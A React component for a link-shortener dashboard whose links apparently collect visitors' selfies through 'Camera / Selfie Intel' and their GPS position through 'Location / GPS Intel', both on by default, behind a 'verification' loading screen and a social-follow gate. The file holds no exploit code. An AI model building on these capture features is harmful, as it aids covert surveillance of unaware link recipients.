"use client";

import { useState } from "react";
import { useApp } from "@/components/AppProvider";
import { ToggleCard } from "@/components/ui/ToggleCard";
import { SocialIcon, SOCIAL_PLATFORMS } from "@/components/ui/SocialIcon";
import type { LinkRecord } from "@/lib/types";

const ANIMATIONS = ["ring", "dots", "pulse", "bar", "orbit"] as const;

const SOCIAL_URL_PREFIXES: Record<string, string> = {
  youtube: "https://youtube.com/@",
  instagram: "https://instagram.com/",
  twitter: "https://x.com/",
  facebook: "https://facebook.com/",
  whatsapp: "https://whatsapp.com/channel/",
  telegram: "https://t.me/",
  tiktok: "https://tiktok.com/@",
  snapchat: "https://snapchat.com/add/",
  linkedin: "https://linkedin.com/in/",
};

function socialPrefix(platform: string): string {
  return SOCIAL_URL_PREFIXES[platform] || "";
}

export function ShortenPanel() {
  const { click, deviceId, phone, user, upsertLink, toast, origin, setTab, setSelected } = useApp();

  const [url, setUrl] = useState("");
  const [camera, setCamera] = useState(true);
  const [location, setLocation] = useState(true);
  const [advanced, setAdvanced] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");
  const [result, setResult] = useState<LinkRecord | null>(null);

  // advanced fields
  const [alias, setAlias] = useState("");
  const [password, setPassword] = useState("");
  const [socialOn, setSocialOn] = useState(false);
  const [socialIcon, setSocialIcon] = useState("youtube");
  const [socialTitle, setSocialTitle] = useState("");
  const [socialUrl, setSocialUrl] = useState("");
  const [socialDesc, setSocialDesc] = useState("");
  const [socialBtn, setSocialBtn] = useState("");
  const [animation, setAnimation] = useState<string>("ring");
  const [animationText, setAnimationText] = useState("LOADING");
  const [expiresAt, setExpiresAt] = useState("");

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!url.trim()) {
      setError("Paste a destination URL first.");
      return;
    }
    if (socialOn && (!socialTitle.trim() || !socialUrl.trim())) {
      setError("Social Guard needs a title and a channel URL.");
      return;
    }

    click(740);
    setBusy(true);
    setResult(null);
    try {
      const { api } = await import("@/lib/client");
      const res = await api.shorten({
        longUrl: url.trim(),
        customAlias: alias.trim() || undefined,
        phoneNumber: phone || undefined,
        deviceId: deviceId || undefined,
        captureCamera: camera,
        captureLocation: location,
        password: password.trim() || undefined,
        socialGateTitle: socialOn ? socialTitle.trim() : undefined,
        socialGateUrl: socialOn ? socialUrl.trim() : undefined,
        socialGateIcon: socialOn ? socialIcon : undefined,
        socialGateDesc: socialOn ? socialDesc.trim() : undefined,
        socialGateBtnText: socialOn ? socialBtn.trim() : undefined,
        animationType: animation,
        animationText: animationText.trim() || "LOADING",
        expiresAt: expiresAt || undefined,
      });

      upsertLink(res.data);
      setResult(res.data);
      setUrl("");
      setAlias("");
      setPassword("");
      toast("Smart link generated — ready to share.", "success");
    } catch (err) {
      const message = err instanceof Error ? err.message : "Could not create the link.";
      setError(message);
      toast(message, "error");
    } finally {
      setBusy(false);
    }
  };

  const copyResult = async () => {
    if (!result) return;
    const { copyText, shortUrlFor } = await import("@/lib/client");
    const ok = await copyText(shortUrlFor(result.short_code, origin));
    toast(ok ? "Short link copied to clipboard!" : "Copy blocked by the browser", ok ? "success" : "error");
  };

  const shareResult = async () => {
    if (!result) return;
    const { shortUrlFor } = await import("@/lib/client");
    const shortUrl = shortUrlFor(result.short_code, origin);
    if (navigator.share) {
      try {
        await navigator.share({ title: "Smart link", text: result.long_url, url: shortUrl });
        return;
      } catch {
        /* user dismissed — fall through to copy */
      }
    }
    const { copyText } = await import("@/lib/client");
    const ok = await copyText(shortUrl);
    toast(ok ? "Link copied — share it anywhere." : "Sharing is unavailable here.", ok ? "success" : "error");
  };

  return (
    <section className="liquid-glass-box rounded-[26px] sm:rounded-[38px] p-3.5 sm:p-8 relative">
      <div className="mb-3.5 sm:mb-6">
        <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-white/70 border border-white/95 text-zinc-900 text-[10px] sm:text-[11px] font-extrabold tracking-wide uppercase shadow-sm">
          <span className="text-[11px]">🚀</span>
          <span>3D Liquid Glass Control Center</span>
        </div>
        <h2 className="mt-2.5 text-[19px] sm:text-[26px] font-black text-zinc-900 tracking-tight leading-tight">
          Generate Smart Links &amp; Verify Visitors
        </h2>
        <p className="mt-1 text-[11.5px] sm:text-[13px] font-semibold text-zinc-600 leading-snug max-w-2xl">
          Paste any destination URL to create ultra-fast short links with camera verification, GPS
          intelligence, and password protection.
        </p>
      </div>

      <form onSubmit={submit} className="space-y-3.5">
        {/* URL input */}
        <div className="flex flex-col sm:flex-row gap-2.5">
          <div className="relative flex-1">
            <span className="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-400">
              <svg viewBox="0 0 24 24" className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round">
                <path d="M10 13a5 5 0 007.5.5l2-2a5 5 0 00-7-7L11 6" />
                <path d="M14 11a5 5 0 00-7.5-.5l-2 2a5 5 0 007 7L13 18" />
              </svg>
            </span>
            <input
              type="text"
              inputMode="url"
              value={url}
              onChange={(e) => setUrl(e.target.value)}
              placeholder="https://your-destination-link.com/very/long/path"
              className="w-full liquid-glass-input pl-11 pr-4 py-3 sm:py-3.5 text-[13px] sm:text-sm font-bold text-zinc-900 placeholder:text-zinc-400"
              aria-label="Destination URL"
            />
          </div>
          <button
            type="submit"
            disabled={busy || !url.trim()}
            onClick={() => click(740)}
            className="glass-orb orb-blue w-full sm:w-auto sm:min-w-[13rem] min-h-[50px] py-3 sm:py-3.5 px-5 text-[13px] sm:text-[14px] font-black uppercase tracking-wider flex items-center justify-center gap-2.5 shadow-2xl transition-all disabled:opacity-50 text-white cursor-pointer"
          >
            {busy ? (
              <>
                <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                <span>Generating 3D Liquid Link...</span>
              </>
            ) : (
              <>
                <span className="text-[15px]">⚡</span>
                <span>Shorten &amp; Generate Link</span>
              </>
            )}
          </button>
        </div>

        {/* verification toggles */}
        <div>
          <p className="text-[10px] font-black uppercase tracking-wider text-zinc-700 mb-1.5">
            Quick Verification Toggles
          </p>
          <div className="grid grid-cols-2 gap-2 sm:gap-4">
            <ToggleCard
              active={camera}
              tone="blue"
              onToggle={() => {
                click(camera ? 460 : 680);
                setCamera(!camera);
              }}
              title="Camera"
              subtitle="Selfie Intel"
              onLabel="Camera verification ON"
              offLabel="Camera verification OFF"
              icon={
                <svg viewBox="0 0 24 24" className="w-4 h-4 sm:w-5 sm:h-5" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round">
                  <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z" />
                  <circle cx="12" cy="13" r="4" />
                </svg>
              }
            />
            <ToggleCard
              active={location}
              tone="green"
              onToggle={() => {
                click(location ? 460 : 680);
                setLocation(!location);
              }}
              title="Location"
              subtitle="GPS Intel"
              onLabel="GPS authorization ON"
              offLabel="GPS authorization OFF"
              icon={
                <svg viewBox="0 0 24 24" className="w-4 h-4 sm:w-5 sm:h-5" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round">
                  <path d="M21 10c0 7-9 12-9 12s-9-5-9-12a9 9 0 0118 0z" />
                  <circle cx="12" cy="10" r="3" />
                </svg>
              }
            />
          </div>
        </div>

        {/* advanced */}
        <div className="pt-1">
          <button
            type="button"
            onClick={() => {
              click(600);
              setAdvanced(!advanced);
            }}
            className="w-full flex items-center justify-between px-4 py-2.5 rounded-2xl bg-white/55 hover:bg-white/80 border-2 border-white/80 transition-all text-left cursor-pointer active:scale-[0.99]"
          >
            <span className="flex items-center gap-2.5">
              <span className="w-8 h-8 rounded-xl bg-gradient-to-br from-violet-500 to-indigo-700 text-white flex items-center justify-center shadow-sm">
                <svg viewBox="0 0 24 24" className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round">
                  <circle cx="12" cy="12" r="3" />
                  <path d="M19.4 15a1.6 1.6 0 00.3 1.8l.1.1a2 2 0 11-2.8 2.8l-.1-.1a1.6 1.6 0 00-1.8-.3 1.6 1.6 0 00-1 1.5V21a2 2 0 11-4 0v-.1A1.6 1.6 0 006 19.4a1.6 1.6 0 00-1.8.3l-.1.1a2 2 0 11-2.8-2.8l.1-.1a1.6 1.6 0 00.3-1.8 1.6 1.6 0 00-1.5-1H0a2 2 0 110-4h.1A1.6 1.6 0 001.6 6a1.6 1.6 0 00-.3-1.8l-.1-.1a2 2 0 112.8-2.8l.1.1a1.6 1.6 0 001.8.3H6a1.6 1.6 0 001-1.5V0a2 2 0 114 0v.1a1.6 1.6 0 001 1.5 1.6 1.6 0 001.8-.3l.1-.1a2 2 0 112.8 2.8l-.1.1a1.6 1.6 0 00-.3 1.8V6a1.6 1.6 0 001.5 1H24a2 2 0 110 4h-.1a1.6 1.6 0 00-1.5 1z" />
                </svg>
              </span>
              <span className="text-[12.5px] font-extrabold text-zinc-900">
                Add More Customizations
              </span>
            </span>
            <span className="flex items-center gap-1.5">
              <span className="text-[9.5px] font-black uppercase tracking-wider text-zinc-500 hidden xs:inline">
                Password, Social Gate, Alias
              </span>
              <svg
                viewBox="0 0 24 24"
                className={`w-4 h-4 text-zinc-600 transition-transform ${advanced ? "rotate-180" : ""}`}
                fill="none"
                stroke="currentColor"
                strokeWidth="2.6"
                strokeLinecap="round"
              >
                <path d="M6 9l6 6 6-6" />
              </svg>
            </span>
          </button>

          {advanced ? (
            <div className="mt-3 space-y-3 animate-slide-up">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <label className="block">
                  <span className="text-[10px] font-black uppercase tracking-wider text-zinc-700">
                    Custom Alias
                  </span>
                  <div className="mt-1 flex items-center liquid-glass-input pl-3 pr-2">
                    <span className="text-[12px] font-bold text-zinc-400 shrink-0">
                      {origin.replace(/^https?:\/\//, "")}/
                    </span>
                    <input
                      type="text"
                      value={alias}
                      onChange={(e) => setAlias(e.target.value.replace(/[^a-zA-Z0-9_-]/g, ""))}
                      maxLength={25}
                      placeholder="myalias"
                      className="flex-1 bg-transparent py-2.5 text-[12.5px] font-bold text-zinc-900 placeholder:text-zinc-400 min-w-0"
                    />
                  </div>
                  <span className="text-[9.5px] font-semibold text-zinc-500 mt-1 block">
                    3–25 characters · letters, numbers, - and _
                  </span>
                </label>

                <label className="block">
                  <span className="text-[10px] font-black uppercase tracking-wider text-zinc-700">
                    Password Protection
                  </span>
                  <div className="mt-1 relative">
                    <input
                      type="text"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Optional password"
                      className="w-full liquid-glass-input px-4 py-2.5 text-[12.5px] font-bold text-zinc-900 placeholder:text-zinc-400"
                    />
                    <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[13px]">
                      {password ? "🔒" : "🔓"}
                    </span>
                  </div>
                  <span className="text-[9.5px] font-semibold text-zinc-500 mt-1 block">
                    {password ? "Visitors must type this to continue." : "Link will be public."}
                  </span>
                </label>
              </div>

              {/* social gate */}
              <div className="clay-recessed p-3 rounded-2xl">
                <div className="flex items-center justify-between gap-2">
                  <div className="min-w-0">
                    <p className="text-[12px] font-extrabold text-zinc-900">Social Guard (Sub2Unlock)</p>
                    <p className="text-[9.5px] font-semibold text-zinc-500">
                      {socialOn
                        ? `${SOCIAL_PLATFORMS.find((p) => p.key === socialIcon)?.label} verification gate`
                        : "Social gate is disabled."}
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={() => {
                      click(socialOn ? 460 : 680);
                      setSocialOn(!socialOn);
                    }}
                    aria-pressed={socialOn}
                    className={`shrink-0 w-10 h-[1.375rem] rounded-full p-0.5 transition-colors flex items-center ${
                      socialOn ? "bg-indigo-600" : "bg-zinc-300/80"
                    }`}
                  >
                    <span
                      className={`w-4 h-4 rounded-full bg-white shadow-sm transition-transform ${
                        socialOn ? "translate-x-[1.15rem]" : "translate-x-0"
                      }`}
                    />
                  </button>
                </div>

                {socialOn ? (
                  <div className="mt-3 space-y-2.5 animate-slide-up">
                    <div>
                      <p className="text-[9.5px] font-black uppercase tracking-wider text-zinc-600 mb-1.5">
                        Select Platform Icon
                      </p>
                      <div className="flex flex-wrap gap-1.5">
                        {SOCIAL_PLATFORMS.map((p) => (
                          <button
                            key={p.key}
                            type="button"
                            onClick={() => {
                              click(500);
                              const nextPrefix = socialPrefix(p.key);
                              if (nextPrefix) {
                                const currentPrefix = socialPrefix(socialIcon);
                                const currentHandle = currentPrefix && socialUrl.startsWith(currentPrefix)
                                  ? socialUrl.slice(currentPrefix.length)
                                  : "";
                                setSocialUrl(`${nextPrefix}${currentHandle}`);
                              } else {
                                setSocialUrl("");
                              }
                              setSocialIcon(p.key);
                            }}
                            title={p.hint}
                            aria-label={p.label}
                            className={`w-8 h-8 rounded-xl flex items-center justify-center border-2 transition-all active:scale-90 ${
                              socialIcon === p.key
                                ? "bg-white border-indigo-500 shadow-md scale-105"
                                : "bg-white/60 border-white/90 hover:bg-white"
                            }`}
                          >
                            <SocialIcon platform={p.key} className="w-4 h-4" />
                          </button>
                        ))}
                      </div>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                      <input
                        value={socialTitle}
                        onChange={(e) => setSocialTitle(e.target.value)}
                        maxLength={120}
                        placeholder="Verify to unlock this link"
                        aria-label="Social gate title"
                        className="w-full px-3 py-2 text-[12px] font-bold rounded-xl border border-zinc-200 bg-white/90 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                      />
                      {socialPrefix(socialIcon) ? (
                        <div className="w-full flex items-center rounded-xl border border-zinc-200 bg-white/90 focus-within:ring-2 focus-within:ring-indigo-500 overflow-hidden">
                          <span className="shrink-0 pl-3 text-[12px] font-bold text-zinc-500 whitespace-nowrap">
                            {socialPrefix(socialIcon)}
                          </span>
                          <input
                            value={socialUrl.slice(socialPrefix(socialIcon).length)}
                            onChange={(e) => setSocialUrl(`${socialPrefix(socialIcon)}${e.target.value}`)}
                            maxLength={500}
                            placeholder="yourusername"
                            aria-label="Social gate username"
                            className="min-w-0 flex-1 bg-transparent px-1.5 py-2 text-[12px] font-bold text-zinc-900 placeholder:text-zinc-400 focus:outline-none"
                          />
                        </div>
                      ) : (
                        <input
                          value={socialUrl}
                          onChange={(e) => setSocialUrl(e.target.value)}
                          maxLength={500}
                          placeholder="https://example.com/your-link"
                          aria-label="Social gate URL"
                          className="w-full px-3 py-2 text-[12px] font-bold rounded-xl border border-zinc-200 bg-white/90 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                        />
                      )}
                      <input
                        value={socialDesc}
                        onChange={(e) => setSocialDesc(e.target.value)}
                        maxLength={240}
                        placeholder="Short description (optional)"
                        aria-label="Social gate description"
                        className="w-full px-3 py-2 text-[12px] font-bold rounded-xl border border-zinc-200 bg-white/90 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                      />
                      <input
                        value={socialBtn}
                        onChange={(e) => setSocialBtn(e.target.value)}
                        maxLength={60}
                        placeholder="Button text (e.g. Verify & Continue)"
                        aria-label="Social gate button text"
                        className="w-full px-3 py-2 text-[12px] font-bold rounded-xl border border-zinc-200 bg-white/90 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                      />
                    </div>
                  </div>
                ) : null}
              </div>

              {/* animation + expiry */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                <label className="block">
                  <span className="text-[10px] font-black uppercase tracking-wider text-zinc-700">
                    Loading Animation
                  </span>
                  <select
                    value={animation}
                    onChange={(e) => setAnimation(e.target.value)}
                    className="mt-1 w-full px-3 py-2.5 text-[12px] font-bold rounded-xl border border-white/90 bg-white/85 focus:outline-none focus:ring-2 focus:ring-blue-500 capitalize"
                  >
                    {ANIMATIONS.map((a) => (
                      <option key={a} value={a}>
                        {a}
                      </option>
                    ))}
                  </select>
                </label>
                <label className="block">
                  <span className="text-[10px] font-black uppercase tracking-wider text-zinc-700">
                    Animation Text
                  </span>
                  <input
                    value={animationText}
                    onChange={(e) => setAnimationText(e.target.value)}
                    maxLength={40}
                    placeholder="LOADING"
                    className="mt-1 w-full px-3 py-2.5 text-[12px] font-bold rounded-xl border border-white/90 bg-white/85 focus:outline-none focus:ring-2 focus:ring-blue-500"
                  />
                </label>
                <label className="block">
                  <span className="text-[10px] font-black uppercase tracking-wider text-zinc-700">
                    Expiration Date (Optional)
                  </span>
                  <input
                    type="date"
                    value={expiresAt}
                    onChange={(e) => setExpiresAt(e.target.value)}
                    className="mt-1 w-full px-3 py-2.5 text-[12px] font-bold rounded-xl border border-white/90 bg-white/85 focus:outline-none focus:ring-2 focus:ring-blue-500"
                  />
                </label>
              </div>

              <p className="text-[10px] font-semibold text-zinc-500">
                {user
                  ? `Signed in as ${user.email} — daily quota ${user.remainingToday}/${user.dailyLimit}.`
                  : phone
                    ? `Links are synced to ${phone}.`
                    : "Links are synced to this device automatically."}
              </p>
            </div>
          ) : null}
        </div>

        {error ? (
          <p className="text-[11.5px] font-bold text-rose-700 bg-rose-50/90 border border-rose-200 rounded-xl px-3 py-2 animate-slide-up">
            ⚠️ {error}
          </p>
        ) : null}
      </form>

      {result ? (
        <div className="mt-4 clay-recessed p-3.5 sm:p-4 rounded-2xl animate-slide-up">
          <div className="flex items-center gap-2 mb-1.5">
            <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-[9px] font-black uppercase tracking-wider text-emerald-900">
              Ready to Share
            </span>
            {result.password_hash ? (
              <span className="px-2 py-0.5 rounded-full bg-amber-500/20 border border-amber-500/40 text-[9px] font-black uppercase tracking-wider text-amber-900">
                🔒 Lock
              </span>
            ) : null}
            {result.social_gate_title ? (
              <span className="px-2 py-0.5 rounded-full bg-indigo-500/20 border border-indigo-500/40 text-[9px] font-black uppercase tracking-wider text-indigo-900">
                🚪 Gate
              </span>
            ) : null}
          </div>
          <p className="text-[15px] sm:text-lg font-black text-blue-800 font-mono break-all">
            {origin.replace(/^https?:\/\//, "")}/{result.short_code}
          </p>
          <p className="text-[10.5px] text-zinc-600 font-semibold truncate mt-0.5">
            {result.long_url}
          </p>
          <div className="mt-3 grid grid-cols-2 sm:grid-cols-4 gap-2">
            <button
              onClick={() => {
                click(600);
                void copyResult();
              }}
              className="glass-orb orb-champagne py-2 text-[11px] font-black text-zinc-900"
            >
              Copy
            </button>
            <button
              onClick={() => {
                click(600);
                void shareResult();
              }}
              className="glass-orb orb-blue py-2 text-[11px] font-black text-white"
            >
              Share
            </button>
            <a
              href={`/${result.short_code}`}
              target="_blank"
              rel="noreferrer"
              onClick={() => click(380)}
              className="glass-orb orb-green py-2 text-[11px] font-black text-zinc-950 flex items-center justify-center"
            >
              Test
            </a>
            <button
              onClick={() => {
                click(560);
                setSelected(result);
                setTab("analytics");
              }}
              className="glass-orb orb-purple py-2 text-[11px] font-black text-white"
            >
              View Intel
            </button>
          </div>
        </div>
      ) : null}
    </section>
  );
}
